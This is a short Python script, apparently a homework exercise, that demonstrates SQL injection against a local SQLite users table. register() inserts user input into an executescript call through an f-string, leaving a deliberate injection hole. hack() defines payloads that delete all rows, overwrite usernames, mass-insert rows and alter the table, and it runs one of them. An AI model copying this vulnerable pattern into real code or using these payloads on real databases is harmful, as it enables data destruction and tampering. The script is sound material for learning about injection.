import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('hw.db') as conn:
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS table_users (
                            id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,  
                            username TEXT NOT NULL,
                            password TEXT NOT NULL
                            )""")

        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()

def hack() -> None:
    delete_table = "');DELETE FROM table_users; --"
    update_tabel = "');UPDATE table_users SET username = 'i did sql injection'; --"
    insert = """');WITH RECURSIVE
                    cnt(x,y)
                        as (
                            SELECT 1,1
                            UNION ALL
                            SELECT x + 1, y+1 from cnt
                            LIMIT 1000
                    )
                    INSERT INTO table_users(username, password) SELECT x,y from cnt; --"""
    alter_table = "');ALTER TABLE table_users ADD COLUMN sql_injection; --"
    username: str = "i_like"
    password: str = alter_table
    register(username, password)


if __name__ == '__main__':

    hack()